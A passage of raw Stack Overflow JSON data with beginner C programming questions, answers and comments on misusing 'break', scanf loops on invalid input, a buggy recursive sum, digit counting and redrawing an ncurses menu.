"user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1457546665, "post_id": 35899178, "comment_id": 59458935, "body": "In the example code, if <code>i</code> is less than 10 the loop ended via the <code>break</code> statement."}, {"owner": {"reputation": 999, "user_id": 5668691, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/51b2f0199abaed8efe849372dc60bb35?s=128&d=identicon&r=PG&f=1", "display_name": "Sudipta Kumar Sahoo", "link": "https://stackoverflow.com/users/5668691/sudipta-kumar-sahoo"}, "edited": false, "score": 0, "creation_date": 1457547012, "post_id": 35899178, "comment_id": 59459134, "body": "@dbush There is no point of using one more extra variable &quot;breakout&quot;."}, {"owner": {"reputation": 465, "user_id": 4109266, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/fA4Tx.jpg?s=128&g=1", "display_name": "Michael", "link": "https://stackoverflow.com/users/4109266/michael"}, "edited": false, "score": 0, "creation_date": 1457547919, "post_id": 35899178, "comment_id": 59459688, "body": "i know how to do this with breakout. i remember using break for this purpose. thats why i asked."}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "reply_to_user": {"reputation": 465, "user_id": 4109266, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/fA4Tx.jpg?s=128&g=1", "display_name": "Michael", "link": "https://stackoverflow.com/users/4109266/michael"}, "edited": false, "score": 0, "creation_date": 1457548032, "post_id": 35899178, "comment_id": 59459760, "body": "@An\u0131lErt&#252;rk The <code>break</code> keyword can only be used as a statement by itself to get out of a <code>for</code>, <code>while</code>, or <code>switch</code>.  The <code>if (break == 1)</code> syntax you were trying to use is invalid and does not work."}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "reply_to_user": {"reputation": 465, "user_id": 4109266, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/fA4Tx.jpg?s=128&g=1", "display_name": "Michael", "link": "https://stackoverflow.com/users/4109266/michael"}, "edited": false, "score": 0, "creation_date": 1457550453, "post_id": 35899178, "comment_id": 59461359, "body": "@An\u0131lErt&#252;rk See my edit regarding the relevant link from the standard."}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 3, "last_activity_date": 1457548246, "last_edit_date": 1457548246, "creation_date": 1457546566, "answer_id": 35899178, "question_id": 35899100, "link": "https://stackoverflow.com/questions/35899100/if-break-1-break-is-not-working/35899178#35899178", "title": "If (break == 1) break; is not working", "body": "<p><code>break</code> is a keyword and can't be used as a variable.</p>\n\n<p>From <a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1256.pdf\" rel=\"nofollow\">section 6.8.6.3 of the C standard</a>:</p>\n\n<blockquote>\n  <p>1  A break statement shall appear only in or as a switch body or loop body.</p>\n  \n  <p>2 A break statement terminates execution of the smallest enclosing switch\n  or iteration statement. </p>\n</blockquote>\n\n<p>If you want to detect whether or not you broke out of the <code>for</code> loop, you need a separate variable for that:</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n\nint main() {\n    int i, breakout = 0;\n    for( i = 0; i&lt; 10 ; i++ ) {\n        printf(\"test1 &amp;d\", i);\n        if (i == 2) {\n            breakout = 1;\n            break;\n        }\n    }\n    if (breakout == 1) //line 10\n        printf(\"test2 %d\", i);\n\n    getchar();\n    return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1356, "user_id": 4584421, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/xdIx5.png?s=128&g=1", "display_name": "Julian Declercq", "link": "https://stackoverflow.com/users/4584421/julian-declercq"}, "is_accepted": false, "score": 1, "last_activity_date": 1457546611, "creation_date": 1457546611, "answer_id": 35899191, "question_id": 35899100, "link": "https://stackoverflow.com/questions/35899100/if-break-1-break-is-not-working/35899191#35899191", "title": "If (break == 1) break; is not working", "body": "<p>You cannot compare 'break' with an integer. Break is a statement that makes you leave the current loop.\nI am not sure what your intent is? What are you trying to do?</p>\n\n<p>For more information in break:\n<a href=\"https://msdn.microsoft.com/en-us/library/37zc9d2w.aspx\" rel=\"nofollow\">https://msdn.microsoft.com/en-us/library/37zc9d2w.aspx</a></p>\n"}, {"tags": [], "owner": {"reputation": 144, "user_id": 6019461, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ae370463f3a20799276da301afaa48f6?s=128&d=identicon&r=PG&f=1", "display_name": "Industrialactivity", "link": "https://stackoverflow.com/users/6019461/industrialactivity"}, "is_accepted": false, "score": 0, "last_activity_date": 1457546659, "creation_date": 1457546659, "answer_id": 35899204, "question_id": 35899100, "link": "https://stackoverflow.com/questions/35899100/if-break-1-break-is-not-working/35899204#35899204", "title": "If (break == 1) break; is not working", "body": "<p>The <code>break</code> statement is not a function, therefore it does not return a value when the statement is used. This means that the comparison 'break ==1` is invalid and can not be tested. </p>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 6041027, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/2fc6548a0b1584e1e13b5cafd2b88807?s=128&d=identicon&r=PG", "display_name": "iluetich", "link": "https://stackoverflow.com/users/6041027/iluetich"}, "is_accepted": false, "score": 0, "last_activity_date": 1457546659, "creation_date": 1457546659, "answer_id": 35899205, "question_id": 35899100, "link": "https://stackoverflow.com/questions/35899100/if-break-1-break-is-not-working/35899205#35899205", "title": "If (break == 1) break; is not working", "body": "<p>The problem with your code is that you're using 'break' as a variable, and it's a reserved word; You can't treat it as a variable.</p>\n\n<p>If what you are trying to accomplish is to do something if and only if the for-loop broke out, you could just invoke printf before the break statement and it would work just fine.</p>\n"}, {"tags": [], "owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "is_accepted": false, "score": 4, "last_activity_date": 1457546691, "creation_date": 1457546691, "answer_id": 35899219, "question_id": 35899100, "link": "https://stackoverflow.com/questions/35899100/if-break-1-break-is-not-working/35899219#35899219", "title": "If (break == 1) break; is not working", "body": "<p>The <code>break</code> is not a variable, you cannot compare it. It is an instruction. If you want to know if the loop exited prematurely, instead of</p>\n\n<pre><code>if (break == 1)\n</code></pre>\n\n<p>you could use</p>\n\n<pre><code>if (i &lt; 10)\n</code></pre>\n"}], "owner": {"reputation": 465, "user_id": 4109266, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/fA4Tx.jpg?s=128&g=1", "display_name": "Michael", "link": "https://stackoverflow.com/users/4109266/michael"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 172, "favorite_count": 0, "accepted_answer_id": 35899178, "answer_count": 5, "score": -8, "last_activity_date": 1457613423, "creation_date": 1457546355, "last_edit_date": 1457613423, "question_id": 35899100, "link": "https://stackoverflow.com/questions/35899100/if-break-1-break-is-not-working", "title": "If (break == 1) break; is not working", "body": "<pre><code>#include&lt;stdio.h&gt;\n\nint main() {\n    int i;\n    for( i = 0; i&lt; 10 ; i++ ) {\n        printf(\"test1 &amp;d\", i);\n        if (i == 2)\n            break;\n    }\n    if (break == 1) //line 10\n        printf(\"test2 %d\", i);\n\n    getchar();\n    return 0;\n}\n</code></pre>\n\n<p>This code returns two errors. First is syntax error break at line 10. Second is expected an expression at line 10. </p>\n\n<p>edit: I didnt use break as a variable. I remember using break for this purpose few years ago and i remember it used to work. So i asked to learn if it worked back then because i was using a different compiler or something.</p>\n"}, {"tags": ["c", "buffer", "scanf", "stdin", "buffer-overflow"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1457546422, "post_id": 35899051, "comment_id": 59458786, "body": "It&#39;s because the non-numeral <code>d</code> remains in the input buffer, and will stay there no matter how many times you try to read <code>int</code>. I suggest reading with <code>fgets</code> into a string and then extracting the <code>int</code> with <code>sscanf</code>."}, {"owner": {"reputation": 1, "user_id": 6040923, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0d86bc70bb161f594e2274d5a66718d0?s=128&d=identicon&r=PG&f=1", "display_name": "M. Neur", "link": "https://stackoverflow.com/users/6040923/m-neur"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1457546974, "post_id": 35899051, "comment_id": 59459107, "body": "@Weather Vane: I see it&#39;s still out there because of this infinite loop but scanf reads from stdin? it waits for input from stdi. the cppreference mentions <b>data from the a variety of sources</b>. so how use scanf to accept only stdin and ignore buffer, without flush &#39;sscanf&quot; ..?"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1457547374, "post_id": 35899051, "comment_id": 59459372, "body": "You are reading an <code>int</code>. The scan stops at the first non-numeric character, which remains in the input buffer. <code>scanf</code> usually reads <code>stdin</code> through a buffer. I believe it is possible to disable the buffer, but it&#39;s a perverse way of handling the situation. The guys who designed the OS did it for a reason."}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 6040923, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0d86bc70bb161f594e2274d5a66718d0?s=128&d=identicon&r=PG&f=1", "display_name": "M. Neur", "link": "https://stackoverflow.com/users/6040923/m-neur"}, "edited": false, "score": 0, "creation_date": 1457620444, "post_id": 35899225, "comment_id": 59496986, "body": "I don&#39;t understand why EOF. Normally I do <code>while (char c = getchar() != &#39;\\0&#39;);</code> to clear a buffer, and then you say <b>// Make it large enough</b> but in this case age ok, and sometimes we don&#39;t know how large it can become?"}], "tags": [], "owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "is_accepted": false, "score": 1, "last_activity_date": 1457547699, "last_edit_date": 1457547699, "creation_date": 1457546705, "answer_id": 35899225, "question_id": 35899051, "link": "https://stackoverflow.com/questions/35899051/c-scanf-in-a-loop-with-invalid-input/35899225#35899225", "title": "C scanf in a loop with invalid input", "body": "<p>When <code>scanf</code> does not succeed, it leaves the input in the stream. You need to ignore the rest of the line and ask the user to provide the input again. You can add a function like:</p>\n\n<pre><code>void ignoreRestOfLine(FILE* fp)\n{\n   int c;\n   while ( (c = fgetc(fp)) != EOF &amp;&amp; c != '\\n');\n}\n</code></pre>\n\n<p>and call it from <code>main</code>:</p>\n\n<pre><code>if(scanf(\"%d\", &amp;age) &gt; 0) {\n  printf(\"You are %d years old!\\n\", age);  \n} else {\n  // Ignore rest of the line and continue with the loop.\n  ignoreRestOfLine(stdin);\n}\n</code></pre>\n\n<p>Another option is to read the data a line at a time and use <code>sscanf</code> to extract the number from the line.</p>\n\n<pre><code>char line[100]; // Make it large enough\nwhile (age != 0)\n{\n   printf(\"How old are you? \");\n\n   if ( fgets(line, sizeof(line), stdin) == NULL )\n   {\n      // Problem reading a line of text.\n      // Deal with it.\n      break;\n   }\n   else\n   {\n      if(sscanf(line, \"%d\", &amp;age) &gt; 0)\n      {\n         printf(\"You are %d years old!\\n\", age);  \n      }\n   }\n\n   // Try to read again\n}\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 6040923, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0d86bc70bb161f594e2274d5a66718d0?s=128&d=identicon&r=PG&f=1", "display_name": "M. Neur", "link": "https://stackoverflow.com/users/6040923/m-neur"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1086, "favorite_count": 2, "answer_count": 1, "score": 0, "last_activity_date": 1457547699, "creation_date": 1457546170, "question_id": 35899051, "link": "https://stackoverflow.com/questions/35899051/c-scanf-in-a-loop-with-invalid-input", "title": "C scanf in a loop with invalid input", "body": "<p>I have to do this if statement , or it turns in an infinite loop if some invalid input like \"17d\" is set. Why ? I think something with buffer but scanf reads from stdin not from stream?</p>\n\n<pre><code>  int age;\n\n  while (age != 0) {\n    printf(\"How old are you? \");\n\n    if(scanf(\"%d\", &amp;age) &gt; 0) {\n      printf(\"You are %d years old!\\n\", age);  \n    } else {\n      break;\n    }\n\n  }\n</code></pre>\n"}, {"tags": ["c", "function", "recursion", "sum"], "comments": [{"owner": {"reputation": 4888, "user_id": 5785362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a786fd81952576dc07942023bf8830b?s=128&d=identicon&r=PG", "display_name": "tofro", "link": "https://stackoverflow.com/users/5785362/tofro"}, "edited": false, "score": 5, "creation_date": 1457546310, "post_id": 35899022, "comment_id": 59458721, "body": "Recap &quot;checking for equality&quot;. Line 5"}, {"owner": {"reputation": 45920, "user_id": 4996248, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/IUaWZ.jpg?s=128&g=1", "display_name": "John Coleman", "link": "https://stackoverflow.com/users/4996248/john-coleman"}, "edited": false, "score": 1, "creation_date": 1457546339, "post_id": 35899022, "comment_id": 59458741, "body": "If it gives the wrong output, what do you mean by &quot;sort of works&quot;?"}, {"owner": {"reputation": 14477, "user_id": 2505965, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5056f8ef1dc81df419a479f24d5f80f5?s=128&d=identicon&r=PG", "display_name": "Oka", "link": "https://stackoverflow.com/users/2505965/oka"}, "reply_to_user": {"reputation": 45920, "user_id": 4996248, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/IUaWZ.jpg?s=128&g=1", "display_name": "John Coleman", "link": "https://stackoverflow.com/users/4996248/john-coleman"}, "edited": false, "score": 0, "creation_date": 1457546450, "post_id": 35899022, "comment_id": 59458800, "body": "@JohnColeman For a lot of folk, <i>&#39;sort of works&#39;</i> means the compiler stopped crying. :\\"}, {"owner": {"user_type": "does_not_exist", "display_name": "user5818725"}, "reply_to_user": {"reputation": 45920, "user_id": 4996248, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/IUaWZ.jpg?s=128&g=1", "display_name": "John Coleman", "link": "https://stackoverflow.com/users/4996248/john-coleman"}, "edited": false, "score": 0, "creation_date": 1457546481, "post_id": 35899022, "comment_id": 59458830, "body": "@JohnColeman I&#39;m not sure if this a novice thing to say, but if something compiles for me it &quot;sort of works&quot; in my head. Of course it doesn&#39;t actually work. But it runs."}, {"owner": {"user_type": "does_not_exist", "display_name": "user5818725"}, "reply_to_user": {"reputation": 4888, "user_id": 5785362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a786fd81952576dc07942023bf8830b?s=128&d=identicon&r=PG", "display_name": "tofro", "link": "https://stackoverflow.com/users/5785362/tofro"}, "edited": false, "score": 0, "creation_date": 1457546922, "post_id": 35899022, "comment_id": 59459071, "body": "@tofro Oh yeah that was a silly mistake, it fixed the issue! However the negative number still persists."}, {"owner": {"reputation": 9530, "user_id": 5264491, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/233d38e551f3f0f85437e4ae47353d25?s=128&d=identicon&r=PG&f=1", "display_name": "Ian Abbott", "link": "https://stackoverflow.com/users/5264491/ian-abbott"}, "edited": false, "score": 3, "creation_date": 1457547205, "post_id": 35899022, "comment_id": 59459256, "body": "The negative number is the result of undefined behavior. The final <code>printf</code> in your <code>main()</code> has a format string that expects 2 integer arguments, but you only supply 1 integer argument."}, {"owner": {"user_type": "does_not_exist", "display_name": "user5818725"}, "reply_to_user": {"reputation": 9530, "user_id": 5264491, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/233d38e551f3f0f85437e4ae47353d25?s=128&d=identicon&r=PG&f=1", "display_name": "Ian Abbott", "link": "https://stackoverflow.com/users/5264491/ian-abbott"}, "edited": false, "score": 0, "creation_date": 1457547637, "post_id": 35899022, "comment_id": 59459525, "body": "@IanAbbott Ahh yes another silly novice mistake, thanks that fixed the issue!"}, {"owner": {"user_type": "does_not_exist", "display_name": "user5818725"}, "reply_to_user": {"reputation": 4888, "user_id": 5785362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a786fd81952576dc07942023bf8830b?s=128&d=identicon&r=PG", "display_name": "tofro", "link": "https://stackoverflow.com/users/5785362/tofro"}, "edited": false, "score": 0, "creation_date": 1457547739, "post_id": 35899022, "comment_id": 59459581, "body": "@tofro if you wish to put a proper answer i&#39;ll mark your answer as solved."}, {"owner": {"reputation": 4888, "user_id": 5785362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a786fd81952576dc07942023bf8830b?s=128&d=identicon&r=PG", "display_name": "tofro", "link": "https://stackoverflow.com/users/5785362/tofro"}, "edited": false, "score": 0, "creation_date": 1457548294, "post_id": 35899022, "comment_id": 59459925, "body": "@GR412 Thanks - But that would just be a duplicate of a comment collector&#39;s. Let him have it. I sometimes think hinting someone to the bug is better help than providing a ready-made solution."}], "answers": [{"comments": [{"owner": {"reputation": 45920, "user_id": 4996248, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/IUaWZ.jpg?s=128&g=1", "display_name": "John Coleman", "link": "https://stackoverflow.com/users/4996248/john-coleman"}, "edited": false, "score": 0, "creation_date": 1457546463, "post_id": 35899110, "comment_id": 59458810, "body": "it isn&#39;t the cause of the error, and with pass by value I don&#39;t see why you deem it to be problematic"}, {"owner": {"reputation": 481, "user_id": 5916150, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c209005186a84dd1820b220d7b78527e?s=128&d=identicon&r=PG&f=1", "display_name": "Arif Burhan", "link": "https://stackoverflow.com/users/5916150/arif-burhan"}, "reply_to_user": {"reputation": 45920, "user_id": 4996248, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/IUaWZ.jpg?s=128&g=1", "display_name": "John Coleman", "link": "https://stackoverflow.com/users/4996248/john-coleman"}, "edited": false, "score": 0, "creation_date": 1457547596, "post_id": 35899110, "comment_id": 59459502, "body": "I see the problem : recursive functions need their own <b>auto</b> variables to store intermediate results if the calculation."}, {"owner": {"reputation": 45920, "user_id": 4996248, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/IUaWZ.jpg?s=128&g=1", "display_name": "John Coleman", "link": "https://stackoverflow.com/users/4996248/john-coleman"}, "edited": false, "score": 0, "creation_date": 1457547841, "post_id": 35899110, "comment_id": 59459638, "body": "There is no problem to see. OP&#39;s function works fine as soon as the <code>=</code> vs. <code>==</code> typo is fixed. Since your answer had nothing to do with the actual problem and is hurting your rep, do you really want to keep it?"}], "tags": [], "owner": {"reputation": 481, "user_id": 5916150, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c209005186a84dd1820b220d7b78527e?s=128&d=identicon&r=PG&f=1", "display_name": "Arif Burhan", "link": "https://stackoverflow.com/users/5916150/arif-burhan"}, "is_accepted": false, "score": -3, "last_activity_date": 1457546378, "creation_date": 1457546378, "answer_id": 35899110, "question_id": 35899022, "link": "https://stackoverflow.com/questions/35899022/c-recursive-function-calling-function-in-main-displays-incorrect-values/35899110#35899110", "title": "C recursive function - Calling function in main displays incorrect values", "body": "<p>The call:</p>\n\n<pre><code>sum(x+1,max);\n</code></pre>\n\n<p>is problematic, better to have:</p>\n\n<pre><code>x++;\nsum(x,max);\n</code></pre>\n\n<p>Although I am not sure this is the cause of your error.</p>\n"}, {"tags": [], "owner": {"reputation": 578, "user_id": 2166946, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/526Nm.jpg?s=128&g=1", "display_name": "Zolt&#225;n", "link": "https://stackoverflow.com/users/2166946/zolt%c3%a1n"}, "is_accepted": true, "score": 0, "last_activity_date": 1457547315, "last_edit_date": 1457547315, "creation_date": 1457547189, "answer_id": 35899389, "question_id": 35899022, "link": "https://stackoverflow.com/questions/35899022/c-recursive-function-calling-function-in-main-displays-incorrect-values/35899389#35899389", "title": "C recursive function - Calling function in main displays incorrect values", "body": "<p>try this:</p>\n\n<pre><code>int sum(int x, int max)\n{\n    if (x == max)\n        return x;\n    return max + sum(x, max - 1);\n}\n</code></pre>\n\n<p>and your last print function sould be like this</p>\n\n<pre><code>printf(\" %i\\n\", sum(min, max));\n</code></pre>\n\n<p>because your <code>sum</code> function returns only one value, but you told printf to print out two integers.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user5818725"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 85, "favorite_count": 0, "accepted_answer_id": 35899389, "answer_count": 2, "score": 0, "last_activity_date": 1457547317, "creation_date": 1457546060, "question_id": 35899022, "link": "https://stackoverflow.com/questions/35899022/c-recursive-function-calling-function-in-main-displays-incorrect-values", "title": "C recursive function - Calling function in main displays incorrect values", "body": "<p>Right so, I have to write a recursive function that takes two values and calaculates the sum of all the numbers between the two values the user entered.</p>\n\n<p>For example if a user were to put in the range of 4 as the first value and 7 as the second number it should print out the sum as 22. As 4+5+6=7 = 22.</p>\n\n<p>So far I have written this code that sort of works but gives the wrong output.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint sum( int x, int max )\n{ \n  if (x = max)\n      return x;\n\n  else\n      return (x + sum( x+1, max));      \n}\n\nint main()\n{\n  int min, max;\n\n  printf(\"Enter your min value: \");\n  scanf(\"%i\", &amp;min);\n\n  printf(\"Enter your max number: \");\n  scanf(\"%i\", &amp;max);\n\n  printf(\"\\n\");\n\n  printf(\" %i\\n %i\\n\", sum(min, max)); //calls the sum function and prints out the sum of the range of values\n\n  return 0;     \n}\n</code></pre>\n\n<p>As you can see on the bottom image rather than printing out the correct answer it only prints out the max value (7) along with an odd negative number.</p>\n\n<p>My feeling is, is that i've called the sum function wrong in main on the last printf. I'm new to functions so i'm not really sure whats going on.</p>\n\n<p>If anyone can help a novice that would be great.</p>\n\n<p>Thanks, GR412.</p>\n\n<p><a href=\"https://i.stack.imgur.com/JTYTR.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/JTYTR.png\" alt=\"Output of program\"></a> </p>\n"}, {"tags": ["c", "debugging", "computer-science"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 2, "creation_date": 1457546231, "post_id": 35898950, "comment_id": 59458670, "body": "How easy is it to store the entry * 11 before you do anything with it? <code>mult11 = number * 11;</code>"}], "answers": [{"tags": [], "owner": {"reputation": 4781, "user_id": 504133, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/cc50d7eefd6013f9119b5df1cc95dadd?s=128&d=identicon&r=PG", "display_name": "nits.kk", "link": "https://stackoverflow.com/users/504133/nits-kk"}, "is_accepted": false, "score": 0, "last_activity_date": 1457546815, "creation_date": 1457546815, "answer_id": 35899270, "question_id": 35898950, "link": "https://stackoverflow.com/questions/35898950/count-number-of-digits-in-array-and-display-them-plus-multiply-it-by-given-numb/35899270#35899270", "title": "Count number of digits in array and display them, plus multiply it by given number", "body": "<p>I am not from c/c++ background, but as per what I can Observe there are two things.</p>\n\n<ol>\n<li><code>for(count = 4; count &gt;= 0; count--)</code> </li>\n</ol>\n\n<p>You have defined <code>int numbers[9]</code>. You should initialize the count with 9 and not 4. But anyways even if you decide to use 4 its OK. \nPlease note that once this loop completes its execution the value of <code>number</code> is modified as you have divided it by 10 in each iteration of the loop</p>\n\n<ol start=\"2\">\n<li>As you use same <code>count</code> in the function you change its value in for loop as below</li>\n</ol>\n\n<p><code>for(count = 0; count &lt; 5; count++)\n    printf(\"Digit Value: %d\\t\\n\", numbers[count]);</code></p>\n\n<p>Value of <code>count</code> is 5 [although if you accept my point 1, then you should change 5 to 9 in you for loop condition also]. \nValue of <code>number</code> has already been modified as I have described above. </p>\n\n<p>This is the reason you can not see the correct number of digits. </p>\n\n<p>I suggest you to calculate the number of digits while filling your array only.</p>\n\n<p>Hope this helps you.</p>\n"}, {"comments": [{"owner": {"reputation": 31, "user_id": 5995228, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb17529a8f3010bd61adead545592bd8?s=128&d=identicon&r=PG&f=1", "display_name": "Rob", "link": "https://stackoverflow.com/users/5995228/rob"}, "edited": false, "score": 0, "creation_date": 1457548749, "post_id": 35899352, "comment_id": 59460227, "body": "Thank you guys. Simple mistakes that I looked over!"}], "tags": [], "owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "is_accepted": true, "score": 0, "last_activity_date": 1457547053, "creation_date": 1457547053, "answer_id": 35899352, "question_id": 35898950, "link": "https://stackoverflow.com/questions/35898950/count-number-of-digits-in-array-and-display-them-plus-multiply-it-by-given-numb/35899352#35899352", "title": "Count number of digits in array and display them, plus multiply it by given number", "body": "<p>You need to re-initialise <code>count</code> before you work out the number of digits</p>\n\n<pre><code>count = 0;              // &lt;&lt;---- add this line\nwhile(number!=0)\n{\n    number/=10;\n    ++count;\n}\n</code></pre>\n\n<p>Your other question was multiplying the entered number by 11. You can do this before you altered it, like this</p>\n\n<pre><code>scanf(\"%d\", &amp;number);\nmult11 = number * 11;\n</code></pre>\n\n<p>then you can print it wherever you like.</p>\n"}], "owner": {"reputation": 31, "user_id": 5995228, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb17529a8f3010bd61adead545592bd8?s=128&d=identicon&r=PG&f=1", "display_name": "Rob", "link": "https://stackoverflow.com/users/5995228/rob"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2497, "favorite_count": 0, "accepted_answer_id": 35899352, "answer_count": 2, "score": 0, "last_activity_date": 1457548709, "creation_date": 1457545826, "last_edit_date": 1457548709, "question_id": 35898950, "link": "https://stackoverflow.com/questions/35898950/count-number-of-digits-in-array-and-display-them-plus-multiply-it-by-given-numb", "title": "Count number of digits in array and display them, plus multiply it by given number", "body": "<p>I have to create an array from an entered value. I also need to display array contents, which I have done and that performs to my liking. I am just having some issues trying to have the program count the amount of digits and display them \"digits detected\" I also need to multiply the original entered value (number) by 11 and display it at the end of my program.</p>\n\n<p><strong>Problems I need help debugging:</strong>\n 1.) Counting and displaying how many digits was entered \n 2.) Multiplying first entered number by 11.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n\nint number, count, mult;\nint numbers[9];\n\n    printf(\"Please enter a number:\\n&gt;\");\n    scanf(\"%d\", &amp;number);\n    mult= number * 11;\n\n    for(count = 4; count &gt;= 0; count--) {\n\n    if(number &lt;= 0)\n    numbers[count] = 0;\n\n    numbers[count] = number % 10;\n    number /= 10;\n\n}\n\n    for(count = 0; count &lt; 5; count++)\n    printf(\"Digit Value: %d\\t\\n\", numbers[count]);\n\n    count = 0;\n    while(number!=0)\n    {\n            number/=10;\n            ++count;\n    }\n    printf(\"Digits Detected: %d\\n\", number);\nreturn 0;\n    }\n</code></pre>\n"}, {"tags": ["c++", "c", "menu", "ncurses"], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user253667"}, "edited": false, "score": 0, "creation_date": 1457615543, "post_id": 35904474, "comment_id": 59493275, "body": "So whenever the menu needs to be redrawn, call free_item() for each item, free_menu() for the menu, and recreate the whole thing?  Oh, and if you care, grab the index of the currently selected item so you can set it back after you recreate it.  Thanks."}], "tags": [], "owner": {"reputation": 42737, "user_id": 4518274, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UPurS.png?s=128&g=1", "display_name": "Thomas Dickey", "link": "https://stackoverflow.com/users/4518274/thomas-dickey"}, "is_accepted": true, "score": 0, "last_activity_date": 1457564827, "creation_date": 1457564827, "answer_id": 35904474, "question_id": 35898431, "link": "https://stackoverflow.com/questions/35898431/how-to-redraw-an-ncurses-menu/35904474#35904474", "title": "How to redraw an ncurses menu", "body": "<p>Recreating the structure is the simplest way.</p>\n\n<p>The form and menu libraries use an abstraction of the keys you type.  That abstraction does not include a resize feature.</p>\n\n<p>You <em>could</em> run <code>wresize</code> for each of the windows in the menu, e.g., these lines from <code>menu.h</code></p>\n\n<pre><code>  WINDOW        *win;                   /* Window containing menu          */\n  WINDOW        *sub;                   /* Subwindow for menu display      */\n  WINDOW        *userwin;               /* User's window                   